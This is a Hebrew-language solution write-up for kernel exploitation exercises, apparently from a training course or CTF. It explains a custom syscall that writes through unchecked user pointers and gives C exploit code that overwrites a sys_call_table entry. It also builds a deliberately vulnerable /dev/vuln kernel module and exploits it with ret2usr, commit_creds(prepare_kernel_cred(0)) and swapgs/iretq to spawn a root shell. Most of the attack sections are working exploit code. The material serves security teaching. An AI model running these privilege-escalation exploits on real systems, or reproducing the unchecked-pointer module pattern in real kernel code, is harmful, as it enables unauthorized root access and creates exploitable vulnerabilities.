## פתרון - ניצול syscall מותאם וret2usr
...
הקריאה שהוסיפו לקרנל היא `sys_upper`, במספר 223. היא מקבלת שני מצביעים:

- הפרמטר `in` - מצביע למחרוזת קלט (מרחב המשתמש).
- הפרמטר `out` - מצביע לחוצץ פלט שאליו הקרנל כותב את התוצאה.
...
הנקודה שצריך לשים לב אליה: הקרנל כותב אל `out[i]` בלי לשאול שאלות מי זה `out`.

### פתרון תרגיל 2 - הבאג

הבאג הוא היעדר בדיקת שפיות על המצביעים. קוד קרנל תקין לעולם לא מפענח מצביע מהמשתמש ישירות; הוא מוודא עם `access_ok` שהמצביע בטווח המשתמש, ומעתיק עם `copy_from_user`/`copy_to_user`. כאן אין אף אחד מאלה. הקרנל מבצע `out[i] = ...` על מצביע גולמי מהמשתמש.

המשמעות: אם ניתן ל-`out` כתובת בתוך מרחב הקרנל, הקרנל (שרץ ב-ring 0) יכתוב לשם בשמחה. קיבלנו **פרימיטיב כתיבה שרירותי לזיכרון הקרנל - write-what-where**. אנחנו שולטים ב"לאן" דרך `out`, וב"מה" דרך `in`. האילוץ היחיד נובע מהלוגיקה: אותיות קטנות מתעוותות, ובית אפס עוצר את ה-`strlen`.

למה זה עבד: כל חולשת ניצול קרנל מתחילה בזיהוי הפרימיטיב. ברגע שראינו כתיבה גולמית למצביע מהמשתמש בהקשר ring 0, ידענו שיש לנו כתיבה לקרנל, וזה כל מה שצריך.
...
שלוש הכתובות שנצטרך: `commit_creds`, `prepare_kernel_cred` (לנוסחת ה-root), ו-`sys_call_table` (היעד שנדרוס). שימו לב שהן במרחב הקרנל (מתחילות ב-`0x80...`), בעוד שהכתובות שלנו במרחב המשתמש נמוכות בהרבה. ההפרדה הזו היא בדיוק מה שנצטרך לגשר עליו עם ret2usr.

למה זה עבד: `kptr_restrict=0` חושף כתובות קרנל אמיתיות לכל תהליך. בקרנל מודרני זה כבוי כברירת מחדל, וזה מה שהופך את האתגר הישן הזה לפשוט יחסית.
...
int main(void)
{
    /* 1. כתובת נקייה: כל הבתים שונים מאפס ומחוץ לטווח 0x61-0x7a */
    unsigned long clean = 0x11223344;              /* בתים: 44 33 22 11 */
    unsigned long page  = clean & ~0xfffUL;        /* בסיס העמוד: 0x11223000 */
    ...
    /* מעתיקים את קוד getroot אל הכתובת הנקייה */
    memcpy((void *)clean, (void *)getroot, 0x100);

    /* 2. מנצלים את הבאג: כותבים את clean אל sys_call_table[223] */
    unsigned char in[5];
    in[0] = (clean      ) & 0xff;   /* 0x44 */
    in[1] = (clean >>  8) & 0xff;   /* 0x33 */
    in[2] = (clean >> 16) & 0xff;   /* 0x22 */
    in[3] = (clean >> 24) & 0xff;   /* 0x11 */
    in[4] = 0;                      /* מסיים אחרי 4 בתים, בלי אפס באמצע */

    unsigned long target = sys_call_table + 223 * sizeof(void *);
    syscall(__NR_upper, in, target);   /* הקרנל כותב את clean אל הטבלה */

    /* 3. קוראים שוב לקריאה 223 - הפעם רצה getroot ב-ring 0 */
    syscall(__NR_upper, 0, 0);

    /* 4. חזרנו נקי דרך יציאת ה-syscall. בודקים ומריצים shell */
    if (getuid() == 0) {
...
למה זה עבד ואיך להכליל: זיהינו פרימיטיב כתיבה לקרנל, המרנו אותו לחטיפת זרימת בקרה (דריסת כניסה בטבלת הקריאות), והפנינו את הזרימה לקוד שלנו במרחב המשתמש (ret2usr). התבנית הזו חוזרת בכל ניצול קרנל: פרימיטיב -> חטיפת זרימה -> `commit_creds(prepare_kernel_cred(0))` -> חזרה נקייה. דריסת כניסה בטבלת הקריאות נתנה לנו חזרה נקייה בחינם, בלי לגעת ב-`iretq`.

### פתרון תרגיל 7 - ret2usr מקומי על x86-64

כדי לתרגל את אותו רעיון בסביבה מודרנית ונשלטת, נבנה מודול קרנל פגיע קטן ונתקוף אותו. המודול חושף התקן `/dev/vuln` עם `ioctl` שמקבל מצביע פונקציה מהמשתמש וקורא לו בהקשר קרנל - בדיוק כמו הקריאה המותאמת חסרת הבדיקה:

```c
/* vuln.c - מודול פגיע לאימון בלבד */
...
{
    void (*fn)(void) = (void (*)(void))arg;  /* מצביע גולמי מהמשתמש - הבאג */
    fn();                                    /* קפיצה בהקשר קרנל */
    return 0;
}
...
מריצים את הקרנל תחת qemu עם ההגנות כבויות (זו סביבת אימון):
...
/* שומרים את מצב המשתמש כדי לחזור אליו אחרי הריצה בקרנל */
...
/* רץ אחרי החזרה למרחב המשתמש */
void get_shell(void) { system("/bin/sh"); }

/* רץ בהקשר קרנל דרך ה-ioctl */
void privesc(void)
{
    ((void (*)(void *))commit_creds)(
        ((void *(*)(void *))prepare_kernel_cred)(0));
...
/* טוענים את הכתובות מ-/proc/kallsyms */
...
int main(void)
{
    ...
    ioctl(fd, 0, (unsigned long)privesc);   /* הקרנל קופץ ל-privesc */

    /* אם הגענו לכאן דרך iretq -> get_shell כבר רץ; ליתר ביטחון: */
    if (getuid() == 0) system("/bin/sh");
    return 0;
}
```

מקמפלים סטטית: `gcc -O0 -static -o exploit exploit.c`, מעלים למכונת ה-qemu, ומריצים. הזרימה: `ioctl` -> הקרנל קורא ל-`privesc` (שנמצא בזיכרון המשתמש, מותר כי SMEP כבוי) -> `commit_creds(prepare_kernel_cred(0))` מדביק לנו creds של root -> `swapgs; iretq` מחזירים אותנו נקי ל-`get_shell` -> shell של root.

הערה על גרסאות: בקרנלים מסוימים (6.2 ומעלה) הפרמטר של `prepare_kernel_cred` השתנה, ו-`prepare_kernel_cred(0)` כבר לא מחזיר בהכרח root; שם משתמשים ב-`&init_task` או בטריק אחר. בסביבת אימון עם קרנל מוקדם יותר, `prepare_kernel_cred(0)` עובד כמצופה.

למה זה עבד ואיך להכליל: זהו בדיוק ret2usr, רק שהחזרה הנקייה נעשית ידנית עם `swapgs; iretq` במקום דרך יציאת syscall, כי כאן חטפנו קריאת פונקציה שרירותית ולא כניסה בטבלת הקריאות. ההבדל מ-ARM הוא רק במנגנון החזרה ובכך שכאן היינו צריכים לכבות מפורשות את SMEP/SMAP/KASLR. אם ההגנות דלוקות, ret2usr נשבר, ואז עוברים לטכניקות של הפרק הבא (למשל ROP בתוך הקרנל עצמו כדי לעקוף SMEP).
